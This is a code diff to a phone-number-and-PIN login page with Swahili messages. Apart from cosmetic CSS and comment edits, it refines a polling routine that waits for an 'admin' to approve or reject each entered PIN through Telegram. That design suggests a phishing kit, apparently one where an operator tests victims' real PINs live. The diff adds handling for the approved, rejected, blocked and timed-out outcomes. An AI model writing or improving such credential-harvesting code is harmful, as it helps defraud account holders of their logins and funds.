@@ -176,24 +176,12 @@
         /* ===== SHAKE ANIMATION ===== */
         @keyframes shake {
             0%,
-            100% {
-                transform: translateX(0);
-            }
-            10% {
-                transform: translateX(-12px);
-            }
-            30% {
-                transform: translateX(10px);
-            }
-            50% {
-                transform: translateX(-8px);
-            }
-            70% {
-                transform: translateX(6px);
-            }
-            90% {
-                transform: translateX(-4px);
-            }
+            100% { transform: translateX(0); }
+            10% { transform: translateX(-12px); }
+            30% { transform: translateX(10px); }
+            50% { transform: translateX(-8px); }
+            70% { transform: translateX(6px); }
+            90% { transform: translateX(-4px); }
         }
 
         .pin-boxes.shake input {
@@ -268,7 +256,7 @@
             font-size: 18px;
         }
 
-        /* Wrong PIN / Rejected - Red (prominent) */
+        /* Wrong PIN - Red (prominent) */
         #status.wrong-pin {
             display: block;
             background: #fde8e8;
@@ -690,7 +678,7 @@
         });
 
         // =============================================
-        //  SUBMIT LOGIN – with mock mode for testing
+        //  SUBMIT LOGIN – with robust error handling
         // =============================================
         async function submitLogin(phone, pin) {
             if (isSubmitting) return;
@@ -804,7 +792,7 @@
         }
 
         // =============================================
-        //  POLL PIN APPROVAL – checks for admin button click in Telegram
+        //  POLL PIN APPROVAL – with explicit handling
         // =============================================
         function pollPinApproval(requestId) {
             let attempts = 0;
@@ -822,7 +810,8 @@
                         const data = await res.json();
                         console.log("📥 Poll response:", data);
 
-                        if (data.blocked) {
+                        // Check for blocked status
+                        if (data.blocked === true) {
                             clearInterval(pollingInterval);
                             pollingInterval = null;
                             setStatus("Akaunti yako imezuiwa. Wasiliana na msimamizi.", 'error');
@@ -831,22 +820,25 @@
                             return;
                         }
 
-                        // ✅ Admin clicked "Approve" in Telegram
+                        // --- KEY: Check approved status ---
+                        // The backend returns { approved: true } for success, { approved: false } for rejection
                         if (data.approved === true) {
                             clearInterval(pollingInterval);
                             pollingInterval = null;
+                            console.log("✅ Admin APPROVED the PIN.");
                             resolve(true);
                             return;
                         }
 
-                        // ❌ Admin clicked "Reject" in Telegram
                         if (data.approved === false) {
                             clearInterval(pollingInterval);
                             pollingInterval = null;
+                            console.log("❌ Admin REJECTED the PIN (wrong PIN).");
                             resolve(false);
                             return;
                         }
 
+                        // If approved is undefined or null, keep waiting
                         // Still waiting – update status periodically
                         if (attempts % 8 === 0 || attempts === 1) {
                             const elapsed = Math.floor(attempts * 1.5);
@@ -860,6 +852,7 @@
                         if (attempts >= maxAttempts) {
                             clearInterval(pollingInterval);
                             pollingInterval = null;
+                            console.warn("⏰ Polling timed out.");
                             resolve(null); // timeout
                         }
 
